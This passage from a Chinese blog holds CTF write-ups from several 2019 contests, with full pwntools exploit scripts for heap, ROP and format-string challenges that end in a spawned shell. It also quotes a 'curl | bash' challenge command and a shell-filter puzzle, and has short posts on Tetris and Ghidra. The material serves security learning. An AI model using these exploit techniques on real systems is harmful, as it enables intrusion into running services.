阮师傅tql，格式化字符串的轮子比fmtstr_payload好用了不是一点点","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"2019上海大学生CTF记录","slug":"2019上海大学生CTF记录","date":"2019-11-06T09:31:14.000Z","updated":"2021-02-22T08:49:52.243Z","comments":true,"path":"2019/11/06/2019上海大学生CTF记录/","link":"","permalink":"/2019/11/06/2019上海大学生CTF记录/","excerpt":"","text":"boring_heapnepire@vm:~/CTF/boring_heap$ checksec pwn [*] &#39;/home/nepire/CTF/boring_heap/pwn&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled nepire@vm:~/CTF/boring_heap$ strings libc.so | grep &quot;GNU&quot; GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al. Compiled by GNU CC version 5.4.0 20160609. GNU Libidn by Simon Josefsson 菜单框架，new，edit，delete，show四个功能，最多能存在30个chunk，new的size限定于[0x20,0x30,0x40] 其中edit功能比较奇怪，可以选择在+n位置开始写size-n个字符 void edit() { int op; // ST04_4 int i; // [rsp+0h] [rbp-10h] puts(&quot;Which one do you want to update?&quot;); i = abs(readint()) % 30; if ( note[i] &amp;&amp; (note_size[i] == 0x20 || note_size[i] == 0x30 || note_size[i] == 0x40) ) { puts(&quot;Where you want to update?&quot;); op = abs(readint()) % note_size[i]; puts(&quot;Input Content:&quot;); readn((note[i] + op), note_size[i] - op); } else { puts(&quot;Invalid Index!&quot;); } } abs可以把0x8000000以上的识别为负数 而求余以后0x20，0x40均为0，只有0x30为–32，通过这个改chunk的size位 from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) #n = remote(&quot;8sdafgh.gamectf.com&quot;,10001) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;5.Exit&#39;) n.sendline(str(idx)) def new(size_i,content): choice(1) n.recvuntil(&quot;3.Large&quot;) n.sendline(str(size_i)) n.recvuntil(&quot;Input Content:&quot;) n.send(content) def edit(idx,size,content): choice(2) n.recvuntil(&quot;update?&quot;) n.sendline(str(idx)) n.recvuntil(&quot;update?&quot;) n.sendline(str(size)) n.recvuntil(&quot;Content:&quot;) n.send(content) def free(idx): choice(3) n.recvuntil(&quot;delete?&quot;) n.sendline(str(idx)) def show(idx): choice(4) n.recvuntil(&quot;view?&quot;) n.sendline(str(idx)) new(2,&#39;0&#39;*0x30) new(2,&#39;1&#39;*0x30)#0x40 new(3,&#39;2&#39;*0x40)#0x50 new(3,&#39;3&#39;*0x40)#0x50 new(2,&#39;4&#39;*0x30)#0x40 new(2,&#39;5&#39;*0x30)#0x30 new(2,&#39;6&#39;*0x30) edit(5,0,(p64(0)+p64(0x21))*2) edit(1,0x80000000,&#39;a&#39;*0x10+p64(0)+p64(0x91)+&#39;\\n&#39;) #gdb.attach(n) free(1) new(2,&#39;a&#39;*7+&#39;\\n&#39;) show(2) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c4b78 print hex(libcbase) #gdb.attach(n) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one = libcbase + 0xf02a4 #+0x20+5-8 new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) new(1,&#39;a&#39;*0x20) edit(4,0x80000000,&#39;a&#39;*0x10+p64(0)+p64(0x51)+&#39;\\n&#39;) free(4) free(5) edit(5,0x80000000,p64(malloc_hook)*2) gdb.attach(n) n.interactive() loginnepire@vm:~/CTF/login$ checksec login [*] &#39;/home/nepire/CTF/login/login&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 经典菜单稍微变了一下变成账户操作，有注册，登录，删除，修改功能，通过strcmp判断登录passwd，成功可输出passwd内容，并且没有限制判断次数 可登录0-9的用户，但最多可注册，删除，修改的用户为0-5 size范围为[0,0xff] 可以直接unsortbin来leaklibc 构造错位控制函数指针和指针内容leak libc ，然后修改为system，sh来getshell from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)#,log_level=&#39;debug&#39;) n = process(&#39;./login&#39;) elf=ELF(&#39;./login&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;Choice&#39;) n.sendline(str(idx)) def login(idx,size,passwd): choice(1) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;length:&#39;) n.sendline(str(size)) n.recvuntil(&#39;password:&#39;) n.send(passwd) def new(idx,size,passwd): choice(2) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;length:&#39;) n.sendline(str(size)) n.recvuntil(&#39;password:&#39;) n.send(passwd) def free(idx): choice(3) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) def edit(idx,passwd): choice(4) n.recvuntil(&#39;id:&#39;) n.sendline(str(idx)) n.recvuntil(&#39;new pass:&#39;) n.send(passwd) heapbase = 0x603000 new(0,0x18,&#39;/bin/sh&#39;) new(1,0xff,&#39;1111&#39;)# unsortbin new(2,0x18,&#39;2222&#39;) free(1) free(2) new(3,0x18,&#39;3333&#39;) libcbase = 0 for i in range(6): for j in range(0,0x100): edit(3,p64(heapbase+0x55-i)) login(2,0x18,p64(libcbase*0x100+j)) n.recvuntil(&#39;\\n&#39;) meg = n.recvline() #n.success(meg) if meg==&quot;Login success!\\n&quot;: libcbase = (libcbase*0x100)+j n.success(hex(libcbase)) break; libcbase = libcbase - 0x3c4b78 n.success(hex(libcbase)) system = libcbase +libc.sym[&#39;system&#39;] edit(3,p64(heapbase+0x10)+p64(system)) login(2,0x18,&#39;/bin/sh&#39;) n.interactive() slient_notenepire@vm:~/CTF/slient_note$ checksec pwn [*] &#39;/home/nepire/CTF/slient_note/pwn&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 只有new，edit，delete的菜单题","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"19巅峰极客","slug":"19巅峰极客","date":"2019-11-05T04:31:37.000Z","updated":"2021-02-22T08:49:52.223Z","comments":true,"path":"2019/11/05/19巅峰极客/","link":"","permalink":"/2019/11/05/19巅峰极客/","excerpt":"","text":"重修补课一整天完全没时间去打，赛后复现时才发现不是很难的亚子（千万别挂科（哭 Rnote 防护全开 IDA去分析下基本的功能 基本的菜单框架 很容易在edit中看到有个很突兀的if语句，这就造成了一个7byte的溢出，并且没有对edit的块进行check是否free掉所以能考虑修改fastbin的fd为mallochook然后修改onegagdget，由于我们只能操作一个堆，但我们能创建最大的size为0x1000，所以想到用orange来创建一个unsortbin 之后的思路就很简单了 修改fd做uaf去修改malloc_hook为one_gadget from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def regs(): n.recvuntil(&#39;name?&#39;) n.sendline(&quot;nepire&quot;) def choice(idx): n.recvuntil(&#39;Your choice &gt; &#39;) n.sendline(str(idx)) def new(size,content): choice(1) n.recvuntil(&quot;Size &gt;&quot;) n.sendline(str(size)) n.recvuntil(&#39;Content &gt; &#39;) n.send(content) def show(): choice(2) def free(): choice(3) def edit(size,content): choice(4) n.recvuntil(&quot;Size &gt; &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content &gt; &quot;) n.send(content) regs() new(0x18,&#39;0000&#39;) edit(0x18+7,&#39;a&#39;*0x18+p32(0xfe1)) new(0x1000,&#39;1111&#39;) new(0x68,&#39;a&#39;*8) show() libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c5188 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase + 0xf02a4 free() edit(0x68,p64(malloc_hook-0x10+5-8)) new(0x68,&#39;aaaa&#39;) new(0x68,&#39;aaa&#39;+p64(one_gadget)*3) choice(1) n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;12&#39;) n.interactive() 然后很蛋疼的是，我payload搓完后才有人和我说比赛的环境是18.04本着懒但是要准确的态度重新搓了个payload from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def regs(): n.recvuntil(&#39;name?&#39;) n.sendline(&quot;nepire&quot;) def choice(idx): n.recvuntil(&#39;Your choice &gt; &#39;) n.sendline(str(idx)) def new(size,content): choice(1) n.recvuntil(&quot;Size &gt;&quot;) n.sendline(str(size)) n.recvuntil(&#39;Content &gt; &#39;) n.send(content) def show(): choice(2) def free(): choice(3) def edit(size,content): choice(4) n.recvuntil(&quot;Size &gt; &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content &gt; &quot;) n.send(content) regs() new(0x18,&#39;0000&#39;) edit(0x18+7,&#39;a&#39;*0x18+p32(0xd91)) new(0x1000,&#39;1111&#39;) new(0x68,&#39;a&#39;*8) show() libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3ec2a0 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase + 0x4f322 free() edit(0x68,p64(malloc_hook-0x10+1-0x8)) new(0x68,&#39;aaaa&#39;) new(0x68,&#39;a&#39;*7+p64(one_gadget)*3) choice(1) n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;114&#39;) n.interactive() flodbg各种反调试反反编译的一题，但是靠猜也很容易猜出来，这里就详细写一下怎么猜出来的 反编译后看main函数先是逐字符输入直到v3==&amp;v7，也就是从[rbp-4D8]开始写，写到[rbp-48C]时停止，也就是76byte，由于这里是int就还要除4，也就是19个字符 接着是预定义一个长度为19的字符串，看到有flag和{}很容易猜到flag是由这串变化来的 由于这里有个简单的反调试，所以先patch一下 patch前 patch后 然后用gdb去调试就能发现其实是进行15轮func3的加密 0123456789abcdefghi func3(f[5],2,7,14) 0123456cdefghi789ab func3(f[2],4,6,17) 012345defghi789ab6c func3(f[9],3,5,10) 012345defghi9ab6c78 func3(f[0],6,9,15) 012345ghi9abdef6c78 func3(f[11],3,6,8) 012345ghi9abde78f6c func3(f[5],1,5,14) 012345abde78f6cghi9 func3(f[0],0,2,19) 2345abde78f6cghi901 func3(f[3],3,5,16) 2345ab78f6cghi901de func3(f[15],1,3,4) 2345ab78f6cghi90e1d func3(f[8],3,6,11) 2345ab78f6c90e1dghi func3(f[0],0,7,19) 8f6c90e1dghi2345ab7 func3(f[16],0,2,3) 8f6c90e1dghi23457ab func3(f[10],0,2,9) 8f6c90e1dg23457abhi func3(f[11],1,3,8) 8f6c90e1dg237abhi45 func3(f[16],0,2,3) 8f6c90e1dg237abh5i4 并且可以发现只是对输入的字符串进行移位，没有对字符本身进行操作，那最简单的就是对比然后替换 flag{My-StL_R0T@+3} 虽然这样能轻松拿到flag，但也得尊重下出题人写那么一大串加密是真的累，所以我们去分析这加密过程先分析下第一次加密 简单调试就能得到这个结果 然后我们不难看出这个的通项 简单的用第二第三论证下 比赛时直接走捷径是爽，但赛后再一步步走还是挺有意思的","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"19RoarCTF记录","slug":"19RoarCTF记录","date":"2019-11-05T04:31:01.000Z","updated":"2021-02-22T08:49:52.215Z","comments":true,"path":"2019/11/05/19RoarCTF记录/","link":"","permalink":"/2019/11/05/19RoarCTF记录/","excerpt":"","text":"比赛时正好遇上作业一大堆，粗略的看了一题就去赶作业了，赛后还是来重新看一遍题目 easypwn Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 防护全开反编译看一下 标准菜单框架 然后又是愉快的逆结构体时间 这里就省略分析过程 struct note { int inuse; int size; char *content; } 我们可以看到create的功能只初始化了新chunk，并未往content写东西 然后简单审计过后就能发现有个很僵硬的漏洞 在往chunk_content内写东西时的size是cmp_min的返回值，而问题就出在cmp_min里 这里僵硬在于这个额外多出的if，本来猜测可能是想输入的size是带’\\n’的但发现这也不对就hen尬 总结下现在得到的可利用点 1.最大可创建size=0x100的chunk 2.edit存在offbyone漏洞 3.菜单选择用的scanf 那么先尝试利用off by one泄露出libc 这里有个细节是它没有用malloc创建堆而是calloc，但没必要去纠结，因为触发malloc_hook的不是这里的malloc 接着就是很直接的，uaf改fd到malloc_hook后把malloc_hook改成one_gadget再用doublefree报错里的malloc触发getshell from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./easy_pwn&#39;) elf = ELF(&#39;./easy_pwn&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;choice: &#39;) n.sendline(str(idx)) def new(size): choice(1) n.recvuntil(&#39;size: &#39;) n.sendline(str(size)) def write(idx,size,content): choice(2) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) n.recvuntil(&#39;size: &#39;) n.sendline(str(size)) n.recvuntil(&#39;content:&#39;) n.send(content) def free(idx): choice(3) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) def show(idx): choice(4) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) new(0x18)#0 new(0x18)#1 new(0x68)#2 new(0x10)#3 write(0,0x18+10,&#39;a&#39;*0x18+&#39;\\x91&#39;) #gdb.attach(n) free(1) new(0x18)#1|2 show(2) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c4b78 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase +0xf02a4 #gdb.attach(n) free(1) new(0x68) free(2) write(1,0x8,p64(malloc_hook-0x18+5)) new(0x68) new(0x68) write(4,0x10+3,&#39;aaa&#39;+p64(one_gadget)*2) free(2) free(1) n.interactive() continue……","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"黑盾杯记录","slug":"黑盾杯记录","date":"2019-11-05T04:30:20.000Z","updated":"2021-02-22T08:49:52.259Z","comments":true,"path":"2019/11/05/黑盾杯记录/","link":"","permalink":"/2019/11/05/黑盾杯记录/","excerpt":"","text":"第一次打黑盾杯，拿了特等，web带哥太强了，这里记录下几题二进制的题 choice LIBC2.23 32位开了NX，感觉挺简单的ida打开看一下很容易就发现有一个offbyone 来修改size来造成栈溢出然后我们在后面看到用这个全局size来readbuf的函数偷偷吐槽（垃圾题目，为出题而出题）这里就直接ret2libc了，也不需要什么技巧 easypwn吐槽一下，比赛完全不知道这还是原题，赛后和Mais的师傅聊的时候才知道这是他们Rctf2015的原题，payload都不用改的那种，我就只能呵呵了（再吐槽**）很常规的栈溢出模板，但这里strcpy会产生\\0截断，而且栈上返回地址后面是0x18的填充字符，需要找pop4的gadget然后就算正常ret2libc了 Reverse02这题没得辩，是我脑子坏了，把最后一个花括号也异或了我们看一下程序 看似Creakme，实际根本点不动，要么出题人脑抽了，要么主办方改题没删好我们ida静态分析一下进来就看到这个函数，实际上也就这个函数异或一下就出flag了，可能是最近想问题自己会在那绕，我就没那么直接就去解了查看了下调用发现前面要过个check才能进这个函数 看一下条件我们很容易就能知道这个this是我们输入的，简单处理下反编译结果然后再把Rkey提取出来我们大致能想到他原本可能是想让我们先逆出注册码然后输入验证码调用输出flag的函数，然后他这个比较尴尬的是，前面这一堆想要你逆出注册码的东西完全没用，直接逆输出flag的函数就能得到flag整理下这个程序的代码然后最简单的做法就是把Dst改成数组就能看出来了 flag{VEg46R4m04f7607c61e732732a0d4f737f34d674f}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"EasyCrackMe初学z3","slug":"EasyCrackMe初学z3","date":"2019-11-05T04:29:45.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/EasyCrackMe初学z3/","link":"","permalink":"/2019/11/05/EasyCrackMe初学z3/","excerpt":"","text":"TokyoWesterns的题目实在有意思，只能水水热身题混混日子 先从文件的逆向开始 一开始很明显，flag长度为39且前6位为TWCTF{最后一位是 } s就相当于flag 接着是一段check，稍微把变量类型修改下看起来舒服些 能看出来这是对flag里[0-9][a-f]进行计次，并且要符合cont_check里的值 接着是两端相似的验证，直接扔上来修改后的 接着就是对[s1,s2,s3,s4]进行check 然后我们老样子把数据从地址中提取出来 然后把上面的整理一下就变成 然后就直接用z3去求这个约束 然后下面也是个简单的判断然后对比，再把这个条件加到约束条件中 然后是检验ascii码之和是否为1160和flag的某些位是否为某个值 这两个整理下加入z3脚本里就是 接着就是最开始的统计字符出现个数的约束这个巨蛋疼，当时不知道z3要用If函数（大写I小写f）用if弄了半天unsat 最终代码 TWCTF{df2b4877e71bd91c02f8ef6004b584a5}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"T-Spin_from_TetrisOnlinePoland","slug":"T-Spin-from-TetrisOnlinePoland","date":"2019-11-05T04:29:05.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/T-Spin-from-TetrisOnlinePoland/","link":"","permalink":"/2019/11/05/T-Spin-from-TetrisOnlinePoland/","excerpt":"","text":"最近沉迷tetris，看了大佬们的操作真的越来越觉得自己宛若一个树懒，所以也要开始对Tetris中的T-Spin进行学习和研究 T-spin原理在现代版的俄罗斯方块中，有着一种称为踢墙的判定，具体来说就是当T块中长边边贴着左右边界的时候，老版的会处于无法旋转的状态，而现代俄罗斯方块加入了踢墙判定相当于可以把方块通过旋转把方块旋进一个本来不可能放进去的地方 T-spin常用模型模型很多种，遇到一个单块的坑就可以考虑用z或s块去组一个T-spin double 还有一种坑型就是有个T块坑，但边缘高度差可能为两到三层，如果是一层的话直接往上加个盖子就能T-spin double了 如果为两层可以考虑用Z，S块去卡一个盖子，如果空间足够也可以考虑用L或J块去卡盖子 如果是三层的话就只能靠L或J卡盖子了，四层以上考虑堆高连combo吧 开局用定式","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Ghidra_9.0工具学习","slug":"Ghidra-9-0工具学习","date":"2019-11-05T04:28:07.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/Ghidra-9-0工具学习/","link":"","permalink":"/2019/11/05/Ghidra-9-0工具学习/","excerpt":"","text":"新出了一个堪比ida的反编译工具，虽然到现在都还没开源的样子，先把一些简单的操作记录一下 导入bini：打开需要查看的程序 Renamel:修改变量名ctrl+l : 修改变量类型 (“4byte:int”,”8byte”:”long”,”8byte”:”size_t”) 3.反编译 ctrl+e : 对选中的函数进行反编译 4.建立结构体 Data Types-&gt;右键对应的filename-&gt;new-&gt;structure 修改DataType为结构体内元素的类型，然后改name使反编译可读性更好 建完存好就可以修改对应的变量类型为这个结构体指针","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"3小时能攻略的pwnablekr","slug":"3小时能攻略的pwnablekr","date":"2019-11-05T04:27:21.000Z","updated":"2021-02-22T08:49:52.203Z","comments":true,"path":"2019/11/05/3小时能攻略的pwnablekr/","link":"","permalink":"/2019/11/05/3小时能攻略的pwnablekr/","excerpt":"","text":"突然就发现自己好像还真没有去好好做过一次pwnable的题目，于是乎看了看时间表，晚上能空出3小时来，所以就愉快的决定填一下之前基础都是瞎搞的坑了emmmmm好麻烦才做不到10题明天一定把wp写了 ➜ kr ls 01fd 03bof 05passcode 07input 09mistake 14cmd1 19unlink 02collision 04flag 06random 08leg 10shellshock 16uaf","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"FireShellCTF2019反思","slug":"FireShellCTF2019反思","date":"2019-11-05T04:26:45.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/FireShellCTF2019反思/","link":"","permalink":"/2019/11/05/FireShellCTF2019反思/","excerpt":"","text":"实在是不应该，赛后看了下Pwn最后一题的EXP反省了下，要是能专注去分析还是能搓出来的，结果到后面也只做出来了常规的三题，不是一个很好的阶段结束，写完这篇总结就去肝19WF的参展品了，比赛估计也要停一段时间打不了。 leakless➜ leakless checksec leakless [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/leakless/leakless&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 很基础的32位ret2libc构造ROP来puts出puts_addr，题目没给libc，但libc-search搜得到libc,通过puts_sym来计算出libc_base，然后再计算出system和/bin/sh的地址,最后构造ROP链执行system(&#39;/bin/sh&#39;)getshell EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./leakless&#39;) n = remote(&#39;35.243.188.20&#39;,2002) elf = ELF(&#39;./leakless&#39;) libc = ELF(&#39;./libc.so&#39;) puts_got = elf.got[&#39;puts&#39;] puts_plt = elf.plt[&#39;puts&#39;] pop_ret = 0x080483ad feedme = 0x080485cb payload = &#39;a&#39;*0x48+&#39;aaaa&#39;+p32(puts_plt)+p32(pop_ret)+p32(puts_got)+p32(feedme) # n.recv() n.sendline(payload) libc_base = u32(n.recv(4))-libc.sym[&#39;puts&#39;] print &quot;libc_base:&quot;,hex(libc_base) payload = &#39;a&#39;*0x4c + p32(libc_base + libc.sym[&#39;system&#39;])+&#39;aaaa&#39;+p32(libc_base+libc.search(&#39;/bin/sh&#39;).next()) n.sendline(payload) n.interactive() FLAGF#{y3ah!!_y0u_d1d_1t!_C0ngr4tz} casino➜ casino checksec casino [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/casino/casino&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 开始输入name的时候有一个0x10byte的格式化字符串，然后接着是100次伪随机数的判定，一开始没细看直接搓了100次判定成功的payload，发现拿不到flag，后来仔细看了下要求是成功的次数大于100次，正常来说是不可能的，但它判定成功后累加的是一个全局变量bet而不是count++或count+=1，也就是说，我们如果把bet改成大于1的值就可以让最终判断成功次数时大于100,而前面的16byte格式化字符串就足够用来修改任意地址的1byte，虽然因为8byte补齐和\\x00截断的问题坑了好久，但最后还是搓出来一个还行的payload EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* from ctypes import * context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./casino&#39;) n = remote(&#39;35.243.188.20&#39;,2001) elf = ELF(&#39;./casino&#39;) libc = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) bet = 0x03 fmt_offset = 10 seed = libc.time(0)/0xa print &quot;seed:&quot;,hex(seed) seed += bet libc.srand(seed) idx = 1 n.recvuntil(&#39;?&#39;) payload = &#39;aaa%11$n&#39;+p32(0x602020).ljust(8,&#39;\\x00&#39;) n.sendline(payload) for i in range(0,99): # n.recvuntil(&#39;number: &#39;) num = libc.rand() sleep(0.08) n.sendline(str(num)) s = &quot;&lt;%03d/100&gt;&quot;%idx log.success(s) idx += 1 n.interactive() FLAGF#{buggy_c4s1n0_1s_n0t_f41r!} babyheap➜ babyheap checksec babyheap [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/babyheap/babyheap&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 本来想说坑，可想想是自己没有先check一下libc版本的锅，只能说自己还不够成熟了（无奈） ➜ babyheap strings libc.so.6 | grep GNU GNU C Library (Ubuntu GLIBC 2.26-0ubuntu2.1) stable release version 2.26, by Roland McGrath et al. Compiled by GNU CC version 6.4.0 20171010. GNU Libidn by Simon Josefsson libc版本是2.26，环境切到2.26下开始分析，很快就能就发现可能存在UAF&amp;double free，还有一个choice为1337功能大致是malloc(0x60)然后写0x40byte的函数，我们可以想到用UAF劫持程序在一个可写的地方(!! bss段开始的地方有stdin和stdout不能覆盖，要加个偏移)malloc一个块然后通过1337函数来伪造bk指针为atoi_got来泄漏出libc，再通过tcache_poisoning把atoi_got改成system_addr后回到有用atoi的地方输入/bin/sh就能得到shell了。 EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./babyheap&#39;) n = remote(&quot;51.68.189.144&quot;, 31005) elf = ELF(&#39;./babyheap&#39;) libc = ELF(&#39;./libc.so.6&#39;) #2.26 def choice(idx): n.recvuntil(&#39;&gt; &#39;) n.sendline(str(idx)) def new(): choice(1) def edit(content): choice(2) n.recvuntil(&#39;Content? &#39;) n.sendline(content) def show(): choice(3) def free(): choice(4) def readn(content): choice(1337) n.recvuntil(&#39;Fill &#39;) n.send(content) bss = elf.bss()+0x20 log.success(hex(bss)) atoi_got = elf.got[&#39;atoi&#39;] log.success(hex(atoi_got)) new() free() edit(p64(bss)) new() # gdb.attach(n) payload = p64(0)*5 + p64(atoi_got) readn(payload) show() n.recvuntil(&#39;Content: &#39;) libc_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;)-libc.sym[&#39;atoi&#39;] print &quot;libc_base:&quot;,hex(libc_base) system_addr = libc_base + libc.sym[&#39;system&#39;] edit(p64(system_addr)) #atoi_got -&gt; system_addr choice(&#39;/bin/sh\\x00&#39;) n.interactive() FLAGF#{W3lc0m3_t0_h34p_Expl01t4t10n!}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"INSCTF2019笔记","slug":"INSCTF2019笔记","date":"2019-11-05T04:08:27.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/INSCTF2019笔记/","link":"","permalink":"/2019/11/05/INSCTF2019笔记/","excerpt":"","text":"总之避免了新年的第一场CTF就爆0的尴尬，但签到热身题没做出来就很难受，这次看了curlpipebash/echoechoechoecho/nyanc/onewrite四题，结果只在gdb调试不动的情况硬刚出来了一题onewrite(n不了，要找一下相关的资料) curlpipebashcurl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash 访问https://curlpipebash.teaser.insomnihack.ch/print-flag.sh后会跳转到https://curlpipebash.teaser.insomnihack.ch/xxxxx-xxxxxx-xxxx-xxxx类似这样的域名，但访问这个路径下的所有东西都会重定向到print-flag.sh，然后就没思路了 echoechoechoecho给了python3的shell源码 #!/usr/bin/env python3 from os import close from random import choice import re from signal import alarm from subprocess import check_output from termcolor import colored alarm(10) colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;yellow&quot;,&quot;magenta&quot;,&quot;cyan&quot;,&quot;white&quot;] # thanks http://patorjk.com/software/taag/#p=display&amp;h=0&amp;f=Crazy&amp;t=echo banner = &quot;&quot;&quot; echoechoechoecho &quot;&quot;&quot; def bye(s=&quot;&quot;): print(s) print(&quot;bye&quot;) exit() def check_input(payload): if payload == &#39;thisfile&#39;: bye(open(&quot;/bin/shell&quot;).read()) if not all(ord(c) &lt; 128 for c in payload):#Only Ascii bye(&quot;ERROR ascii only pls&quot;) #匹配除();+$\\&#39;之外的字符 if re.search(r&#39;[^();+$\\\\= \\&#39;]&#39;, payload.replace(&quot;echo&quot;, &quot;&quot;)): bye(&quot;ERROR invalid characters&quot;) # real echolords probably wont need more special characters than this if payload.count(&quot;+&quot;) &gt; 1 or \\ payload.count(&quot;&#39;&quot;) &gt; 1 or \\ payload.count(&quot;)&quot;) &gt; 1 or \\ payload.count(&quot;(&quot;) &gt; 1 or \\ payload.count(&quot;=&quot;) &gt; 2 or \\ payload.count(&quot;;&quot;) &gt; 3 or \\ payload.count(&quot; &quot;) &gt; 30:#未限制echo和\\的使用次数 bye(&quot;ERROR Too many special chars.&quot;) return payload print(colored(banner, choice(colors))) print(&quot;Hi, what would you like to echo today? (make sure to try &#39;thisfile&#39;)&quot;) payload = check_input(input()) print(&quot;And how often would you like me to echo that?&quot;) count = max(min(int(input()), 10), 0) #输入的转int小于10大于0 == count&lt;=10 &amp;&amp; count &gt;= 0 payload += &quot;|bash&quot;*count close(0) result = check_output(payload, shell=True, executable=&quot;/bin/bash&quot;) bye(result.decode()) bye 毫无思路，对bash的通配符操作还是需要稍微看一下 nyanc用chroot起的arm64程序，搓了一个方便debug的脚本 #!/bin/bash gnome-terminal -x gdb-multiarch nyanc -q -x remote qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu nyanc onewrite➜ onewrite checksec onewrite [!] Did not find any GOT entries [*] &#39;/home/nepire/CTF/pwn/process/2018INSctf/onewrite/onewrite&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary 